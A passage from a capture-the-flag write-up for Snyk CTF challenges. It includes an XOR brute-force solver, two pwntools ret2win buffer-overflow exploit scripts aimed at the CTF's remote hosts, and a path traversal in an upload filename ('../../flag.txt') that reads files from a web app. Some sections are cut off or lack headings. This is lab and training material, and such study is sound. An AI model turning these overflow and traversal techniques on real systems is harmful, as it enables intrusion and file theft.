  I'm XORta out of ideas for how to get the flag. Does this look like anything to you?
{{< /admonition >}}

### Solve Walkthrough

- Given `flag.txt.encry` file and this is the content inside it.

```txt
0x070x0d0x000x060x1a0x020x540x510x050x590x530x020x510x000x530x540x070x520x040x570x550x550x050x510x560x510x530x030x550x500x050x030x050x510x590x540x000x1c
```

- First of all, I ask to GPT, what the heck is this encrypted flag is (coz I'm beginner in RE and crypto stuffs).
- Basically, GPT said that **the flag possibly encrypted with XOR cipher**.
- Here's the solver script generated from GPT.

```python
#!/usr/bin/env python3

data = bytes(
	[0x07, 0x0d, 0x00, 0x06, 0x1a, 0x02, 0x54, 0x51, 0x05, 0x59, 0x53, 0x02, 0x51, 0x00, 0x53, 0x54, 0x07, 0x52, 0x04, 0x57, 0x55, 0x55, 0x05, 0x51, 0x56, 0x51, 0x53, 0x03, 0x55, 0x50, 0x05, 0x03, 0x05, 0x51, 0x59, 0x54, 0x00, 0x1c]
)
print(f"Data: {data}\\nLength of data: {len(data)}")

for key in range(0x20, 0x7F):
  decoded = ''.join(chr(b ^ key) for b in data)
  # Check for printable ASCII value.
  if all(32 <= ord(c) <= 126 or c == '\\n' for c in decoded):
    print(f"Key {hex(key)}: {decoded}")
```

- So, we've to put the sequence of bytes into a list of bytes (*data*).
- Loop from `0x20` until `0x7E`, which is all printable ASCII characters in human readable text, such as *letters*, *numbers*, and *symbols*. The `0x7F` hex value is commonly use for obfuscate the text (`DEL`). Go to this website to see all list of ASCII tables: "[https://byte-tools.com/en/ascii/](https://byte-tools.com/en/ascii)".
- Like the name of this challenge, the printable characters is start from XOR-ing the bytes of data with `0x61` (a).
- `0x07` ^ `0x61` = **f** ; `0x0d` ^ `0x61` = **l** -> can you see the flag pattern ?

![Zero Ex Six One-01](/images/snyk-ctf_warmup1-01.png)

- The if statement inside the for loop is to filtered only readable **decoded text**, which is excluding weird characters such as `\\x00`, `\\xFF`, etc.
- After we run the solver script, the output is like this:

![Zero Ex Six One-02](/images/snyk-ctf_warmup1-02.png)

- Notice in key `0x61` , we got the flag.

### Solve Walkthrough

- Basically, we've to input all "English" words in the screen to get access granted.
- If we got the correct one, then we can continue and choose the option number **2**, which is to print the `flag.txt` file.
- Here's the flag:

# Pwn

## 1. Echo

### Description

{{< admonition type=info title="Click to show the desc" open=false >}}
  Author: @awesome10billion
  
  I made my own echo program. my own echo program.
{{< /admonition >}}

### Solve Walkthrough

- This is an easy pwn challenge.
- A classic PWN ret2win challenge, we must hijack the control flow to **win** function.
- Check the ELF protection with `checksec`:

```bash
Arch:       amd64-64-little
RELRO:      No RELRO
Stack:      No canary found
NX:         NX unknown - GNU_STACK missing
PIE:        No PIE (0x400000)
Stack:      Executable
RWX:        Has RWX segments
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

- Nothing protect us from **ret2win attack**.
- The ELF information is 64-bit and using LE (*little endian*) format.
- Let's discover list of function symbols inside the ELF binary. I'm using Ghidra in this case.

![Echo-01](/images/snyk-ctf_pwn1-01.png)

- Here's the decompiled code of `main` and `win` functions.

```c
undefined8 main(EVP_PKEY_CTX *param_1)
{
  char local_88 [128]; // 0x80 bytes (HEX).
  
  init(param_1);
  puts("Give me some text and I\'ll echo it back to you: ");
  gets(local_88);
  puts(local_88);
  return 0;
}

void win(void)
{
  int iVar1;
  FILE *__stream;
  char local_11;
  
  __stream = fopen("flag.txt","r");
  if (__stream != (FILE *)0x0) goto LAB_0040126a;
  puts("Please create \'flag.txt\' in this directory with your own debugging flag.");
  FUN_00401120(0);
  do {
    putchar((int)local_11);
LAB_0040126a:
    iVar1 = fgetc(__stream);
    local_11 = (char)iVar1;
  } while (local_11 != -1);
  fclose(__stream);
  return;
}
```

- Simply, we've to hijack control flow with **ret2win attack**, so we can start executing `win` function after `ret` main.
- Here's my exploit script for this challenge.

```python
#!/usr/bin/env python3
#filename: exploit.py

from pwn import *

context.binary = elf = ELF("./echo", checksec=0)
context.log_level = "debug"

# Prepare the payload.
win_addr = p64(elf.symbols['win'])
payload = b"A"*0x80 # --------------< Buff size.
payload += b"B"*0x8 # --------------< Old RBP.
payload += win_addr # --------------< Jump to win_addr.

# Send the payload.
is_remote = False # change to True if you want to run remotely.

if is_remote:
	io = remote("challenge.ctf.games", 31084)
else:
	io = elf.process()

io.sendline(payload)
io.interactive()
```

- Create a sample `flag.txt` file to run the exploit script locally. If it success, then we can run the exploit script remotely. Just change the `is_remote` variable to `True`.
- And we got the flag.

  Another binary exploit challenge, but this time it's gonna take some more information for me to give you what you want.
{{< /admonition >}}

### Solve Walkthrough

- This is a medium pwn challenge and I solve it after the challenge ended
- Same as `Echo` challenge before, we've to ret2win to `getFlag` function.
- First, let's check the ELF protection.

```bash
Arch:       i386-32-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX unknown - GNU_STACK missing
PIE:        No PIE (0x8048000)
Stack:      Executable
RWX:        Has RWX segments
Stripped:   No
```

- Hmm, this is a **32-bit ELF binary** and **no protection at all**.
- Let's discover all function symbols using Ghidra.

![Additional Information Needed-01](/images/snyk-ctf_pwn2-01.png)

- Here's the decompiled code of `main` and `getFlag` function.

```c
/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */

undefined4 main(void)

{
  char local_28 [32]; // 0x24 (HEX)
  
  buffer_init();
  puts("Welcome to this simple pwn challenge...");
  puts("All you have to do is make a call to the `getFlag()` function. That\'s it!");
  gets(local_28);
  return 0;
}

/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */

undefined4 getFlag(int param_1,int param_2)

{
  undefined4 uVar1;
  char local_3c [48];
  FILE *local_c;

  // We've to pass this if statement!.
  if (param_1 * param_2 == 0x23) {
    local_c = fopen("flag.txt","r");
    if (local_c != (FILE *)0x0) {
      fgets(local_3c,0x30,local_c);
      puts(local_3c);
      fclose(local_c);
    }
    uVar1 = 0;
  }
  else {
    puts("Nope!");
    uVar1 = 0xffffffff;
  }
  return uVar1;
}
```

- In the disassembly of `getFlag` function, we've to pass if condition with multiply the value of `param_1` and `param_2`, so it will be equal to `0x23` (or 35 in decimal). We can do simple math, for example: `param_1` = **7** and `param_2` = **5**, so the output will be **35**.
- Here's my exploit script for this challenge.

```python
#!/usr/bin/env python3
#filename: exploit.py

"""INFO:
- The binary is x86 (32 bit) architecture.
- The buffer size is 0x24 (36 Bytes) + 0x4 (4 Bytes) for EBP = 40 Bytes.
- All we've to do is just return to `getFlag` function.
"""

from pwn import *

context.binary = elf = ELF("./challenge.elf", checksec=0)
context.log_level = "debug"

# 1. Prepare the payload.
win_addr = p32(elf.symbols['getFlag'])

payload = b"A"*0x24 #----------------< Junk.
payload += b"B"*0x4 #----------------< Old EBP.
payload += win_addr #----------------< Buffer address.
payload += b"C"*0x4 #----------------< Stack alignment.
payload += p32(0x7) #----------------< Param 1 = 7.
payload += p32(0x5) #----------------< Param 2 = 5.

"""Payload from p0np0n
# Link: https://www.youtube.com/watch?v=8wn7ue68vmE
payload = b"A"*40
payload += win_addr
payload += p32(0x41)
payload += p32(1) * 1
payload += p32(0x23)
"""

# Because all function args is placed into the stack.
# [     5     ] = function arg2 / ebp + 0xc
# [     7     ] = function arg1 / ebp + 0x8
# [ alignment ] = stack alignment / caller function
# [    ret    ] = win_addr / getFlag / ebp + 0x4
# [  old rbp  ] = 0x4
# [   buffer  ] = 0x24 / ebp - 0x4

# 2. Send the payload
is_remote = False # change to True if you want to run remotely.

if is_remote:
    io = remote("challenge.ctf.games", 30300)
else:
    io = elf.process()

io.sendline(payload)
io.interactive()
```

- Create a sample `flag.txt` file in your folder to execute the exploit script locally. If it success, then we can run the exploit script remotely. Just change the `is_remote` variable to `True`.
- And we got the flag.

# Web

## Timeoff

### Description

{{< admonition type=info title="Click to show the desc" open=false >}}
  Author: @HuskyHacks
  
  TimeOff is an early build for our upcoming line of business application that will help us manage our employee's PTO requests. Please give it a thorough security test and let us know if you find anything. To set you up for success, our devs have given you the full source code and a development build of the current app. Feel free to build a local instance for your security test. If you find anything exploitable, prove it by capturing the flag.txt file on the live instance!
  
  The challenge source code is available in the challenge.zip folder. The password is `snyk-ftf-2025`. Use the Dockerfile to run a local instance of the challenge! To build and the container, unzip the contents of the challenge.zip file and run: `docker build -t [challenge_name] . && docker run -it -p 3000:3000 [challenge_name]`
  
  Credentials:
  
  - `admin@example.com:admin123`
  - `user@example.com:user123`
{{< /admonition >}}

### Solve Walkthrough

- This is an easy web challenge and I solve it after the challenge ended.
- Execute below command to run the challenge locally.

```bash
docker build -t timeoff:latest . && docker run -d --name "timeoff_challenge" -p 3000:3000 timeoff:latest
```

- After the challenge is up, first thing to do is login using given credentials from the challenge. I try to login directly as an `admin`.
- Too many option there after we logged in, but when I try to upload sample `flag.txt` file, the download file feature is available.
- When I download the file that I just uploaded, I just think that maybe the vulnerability is happen in `name` of the uploaded file. No sanitize on the input, so I can do like `../` attack to read the arbitrary file inside the target machine (in this case is to read the `flag.txt` file).
- Move on to the next step. We need to intercept after submit a new timeoff request. I try to upload sample `flag.txt` file.

![Timeoff-01](/images/snyk-ctf_web1-01.png)

- As you can see, the filename of uploaded file is changed to `../../flag.txt`. If we try to download the file, then we got the real flag from container.

![Timeoff-02](/images/snyk-ctf_web1-02.png)

- Now, we can perform this **Path Traversal attack** on the remote target machine.

![Timeoff-03](/images/snyk-ctf_web1-03.png)

- After we submit new timeoff request, we can download the real flag in the browser.

![Timeoff-04](/images/snyk-ctf_web1-04.png)

- You can also try to scan the source code with `snyk` CLI as the hint says. Here's the output after we scan the given source code.

```bash
snyk code test
--------------
# Output:
# ... output omitted ...
 ✗ [High] Path Traversal 
   Path: app/app/controllers/files_controller.rb, line 6 
   Info: Unsanitized input from "an HTTP parameter" flows into "File.read", where it is used as a path. This may result in a Path Traversal vulnerability and allow an attacker to access arbitrary files.
# ... output omitted ...
```
